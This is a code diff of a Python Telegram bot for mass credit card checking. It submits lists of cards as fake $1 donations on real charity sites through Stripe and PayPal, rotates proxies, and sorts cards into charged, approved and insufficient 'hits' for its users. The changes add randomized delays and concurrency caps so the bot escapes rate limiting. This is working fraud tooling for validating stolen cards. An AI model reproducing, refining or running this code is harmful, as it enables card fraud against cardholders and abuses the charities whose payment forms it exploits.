@@ -1,6 +1,6 @@
 # ==============================================================================
 # 𝐒𝐇𝐎𝐏𝐈𝐅𝐘, 𝐒𝐓𝐑𝐈𝐏𝐄 & 𝐏𝐀𝐘𝐏𝐀𝐋 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (CUSTOM ANIMATED EMOJIS, CHARGED FONT, ASYNC APIS, STRICT EXACT RESPONSES)
+# (STRICT EXACT RESPONSES, SMART DELAYS, NO THREADS UI FOR APIs, CHARGED FONT)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -420,7 +420,7 @@ async def get_bin_info(bin_code):
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
 async def check_stripe_donate_api(card, proxy):
-    """STRICT Stripe 1$ Gateway with Isolated Sessions & Exact Outputs"""
+    """STRICT Stripe 1$ Gateway with Isolated Sessions & Delayed Execution"""
     try:
         parts = card.split('|')
         if len(parts) < 4: return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
@@ -435,7 +435,8 @@ async def check_stripe_donate_api(card, proxy):
         base_url = 'https://printsofhope.org'
         ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
         
-        # 1. ISOLATED SESSION
+        # 1. ISOLATED SESSION & DELAY
+        await asyncio.sleep(random.uniform(1.0, 2.0))
         connector = aiohttp.TCPConnector(ssl=False)
         async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
             headers_get = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
@@ -446,6 +447,7 @@ async def check_stripe_donate_api(card, proxy):
                 fid_match = re.search(r'form-id[=]+(\d+)', html)
                 if fid_match:
                     iframe_url = f'{base_url}/?givewp-route=donation-form-view&form-id={fid_match.group(1)}'
+                    await asyncio.sleep(1)
                     async with local_session.get(iframe_url, headers=headers_get, proxy=proxy_str, timeout=20) as r2:
                         html = await r2.text()
 
@@ -476,23 +478,24 @@ async def check_stripe_donate_api(card, proxy):
                 'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
                 'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
             }
+            await asyncio.sleep(1)
             async with local_session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxy=proxy_str, timeout=20) as r3:
                 await r3.text()
 
             headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua}
             stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={site_url}&time_on_page=85758&key={pk_v}{sa_param}'
 
+            await asyncio.sleep(1)
             async with local_session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, proxy=proxy_str, timeout=20) as r4:
                 sr = await r4.json()
 
             if 'error' in sr:
-                err_code = sr['error'].get('code', '')
-                err_decline = sr['error'].get('decline_code', '')
                 err_msg = sr['error'].get('message', '').lower()
+                err_code = sr['error'].get('code', '')
                 
-                if 'insufficient' in err_msg or err_code == 'insufficient_funds' or err_decline == 'insufficient_funds': 
+                if 'insufficient' in err_msg or err_code == 'insufficient_funds': 
                     return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-                elif 'incorrect' in err_msg or err_code in ['incorrect_cvc', 'incorrect_zip'] or err_decline in ['incorrect_cvc', 'incorrect_zip']: 
+                elif 'incorrect' in err_msg or err_code in ['incorrect_cvc', 'incorrect_zip', 'invalid_cvc']: 
                     return {'status': 'Approved', 'message': 'approved', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
                 elif err_code == 'rate_limit': 
                     return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
@@ -507,6 +510,7 @@ async def check_stripe_donate_api(card, proxy):
             data_final['give_stripe_payment_method'] = pm_id
             data_final.pop('give_ajax', None)
             
+            await asyncio.sleep(1)
             async with local_session.post(site_url, params=params_final, headers=headers_final, data=data_final, proxy=proxy_str, timeout=30, allow_redirects=True) as r5:
                 final_text = await r5.text()
                 current_url = str(r5.url).lower()
@@ -528,7 +532,7 @@ async def check_stripe_donate_api(card, proxy):
     except Exception: return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
 async def check_paypal_donate_api(card, proxy):
-    """STRICT PayPal 1$ Gateway with Isolated Sessions & Exact Outputs"""
+    """STRICT PayPal 1$ Gateway with Isolated Sessions & Delayed Execution"""
     try:
         parts = card.split('|')
         if len(parts) < 4: return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
@@ -543,7 +547,8 @@ async def check_paypal_donate_api(card, proxy):
         urll = "https://www.callahandogs.com/donate/"
         ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
 
-        # 1. ISOLATED SESSION
+        # 1. ISOLATED SESSION & DELAY
+        await asyncio.sleep(random.uniform(1.0, 2.0))
         connector = aiohttp.TCPConnector(ssl=False)
         async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
             
@@ -573,6 +578,7 @@ async def check_paypal_donate_api(card, proxy):
                 'billing_country': 'US', 'card_address': 'RTS 58/3 Bark Camp', 'card_address_2': '',
                 'card_city': 'Alkol', 'card_state': 'WV', 'card_zip': '25501', 'give-gateway': 'paypal-commerce'
             }
+            await asyncio.sleep(1)
             async with local_session.post(url2, data=payload2, headers=headers_get, proxy=proxy_str, timeout=20) as r2:
                 try:
                     j2 = await r2.json()
@@ -595,10 +601,12 @@ async def check_paypal_donate_api(card, proxy):
                 'authorization': "Bearer " + au, 'braintree-sdk-version': "3.32.0-payments-sdk-dev",
                 'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6"
             }
+            await asyncio.sleep(2)
             async with local_session.post(url3, json=payload3, headers=headers3, proxy=proxy_str, timeout=20) as r3:
                 await r3.text()
 
             url4 = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
+            await asyncio.sleep(1)
             async with local_session.post(url4, data=payload2, headers=headers_get, proxy=proxy_str, timeout=20) as r4:
                 try: j4 = await r4.json()
                 except: return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
@@ -1131,7 +1139,14 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     cards = PENDING_FILES.pop(uid, None)
     if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
-    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
+    
+    # Hide Threads for direct APIs to prevent confusion
+    if gn in ["Stripe", "PayPal"]:
+        workers_display = ""
+    else:
+        workers_display = f"\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>"
+        
+    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>{workers_display}\n╰ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
@@ -1143,6 +1158,10 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     http_session = await get_user_http_session(uid)
     
     last_resp = sf("Waiting for response...")
+    
+    # Configure concurrency limits: Direct APIs get less concurrent load to prevent Rate Limits
+    concurrency_limit = 2 if gate_name in ["Stripe", "PayPal"] else WORKERS
+    sem = asyncio.Semaphore(concurrency_limit)
     
     def is_stopped(): return process_store.get(uid, {}).get("stopped", False)
 
@@ -1157,7 +1176,12 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
             h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
             
-            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_TIME} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
+            if gate_name in ["Stripe", "PayPal"]:
+                workers_display = ""
+            else:
+                workers_display = f"\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>"
+            
+            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>{workers_display}\n├ <b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_TIME} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
             
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
@@ -1183,48 +1207,54 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
         while not queue.empty() and not is_stopped():
             try: card = queue.get_nowait()
             except Exception: break
-            try:
-                c_st = time.time()
-                
-                if gate_name == "Stripe":
-                    p = random.choice(proxies) if proxies else None
-                    res = await check_stripe_donate_api(card, p)
-                elif gate_name == "PayPal":
-                    p = random.choice(proxies) if proxies else None
-                    res = await check_paypal_donate_api(card, p)
-                else:
-                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
-                
-                if is_stopped(): break 
-                
-                c_el = time.time() - c_st
-                status = res.get('status', 'Dead')
-                chk += 1
-                
-                raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
-                short_msg = (raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg
-                
-                last_resp = sf(short_msg)
-                
-                if status == 'Charged':
-                    chg += 1
-                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
-                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
-                elif status == 'Approved':
-                    app += 1; asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
-                elif status == 'Insufficient':
-                    ins += 1
-                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
-                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
-                elif status == 'Site Error': err += 1
-                else: dec += 1
-            except asyncio.CancelledError: break
-            except Exception: err += 1; chk += 1
-            finally:
-                queue.task_done()
-                if not is_stopped(): await asyncio.sleep(DELAY)
+            
+            async with sem:
+                if is_stopped(): break
+                try:
+                    c_st = time.time()
+                    
+                    if gate_name == "Stripe":
+                        p = random.choice(proxies) if proxies else None
+                        res = await check_stripe_donate_api(card, p)
+                    elif gate_name == "PayPal":
+                        p = random.choice(proxies) if proxies else None
+                        res = await check_paypal_donate_api(card, p)
+                    else:
+                        res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
+                    
+                    if is_stopped(): break 
+                    
+                    c_el = time.time() - c_st
+                    status = res.get('status', 'Dead')
+                    chk += 1
+                    
+                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
+                    short_msg = (raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg
+                    
+                    last_resp = sf(short_msg)
+                    
+                    if status == 'Charged':
+                        chg += 1
+                        asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
+                        asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
+                    elif status == 'Approved':
+                        app += 1; asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
+                    elif status == 'Insufficient':
+                        ins += 1
+                        asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
+                        asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
+                    elif status == 'Site Error': err += 1
+                    else: dec += 1
+                except asyncio.CancelledError: break
+                except Exception: err += 1; chk += 1
+                finally:
+                    queue.task_done()
+                    if not is_stopped(): await asyncio.sleep(DELAY)
 
-    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
+    # Spawn workers based on Gateway Concurrency limits
+    wt_count = concurrency_limit if gate_name in ["Stripe", "PayPal"] else WORKERS
+    wt = [asyncio.create_task(worker(i)) for i in range(wt_count)]
+    
     process_store[uid]["tasks"] = wt + [ut]
     await asyncio.gather(*wt, return_exceptions=True)
     if not ut.done(): ut.cancel()
@@ -1233,7 +1263,12 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     h, m, s = el // 3600, (el % 3600) // 60, el % 60
     avg_cpm = int((chk / el) * 60) if el > 0 else 0
     
-    ft = f"<b>{CE_STAR} {sf('DONE')}</b>\n\n├ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_TIME} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
+    if gate_name in ["Stripe", "PayPal"]:
+        workers_display = ""
+    else:
+        workers_display = f"\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>"
+        
+    ft = f"<b>{CE_STAR} {sf('DONE')}</b>\n\n├ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>{workers_display}\n├ <b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_TIME} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
     
     fkb = [
         [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none", style="success")],
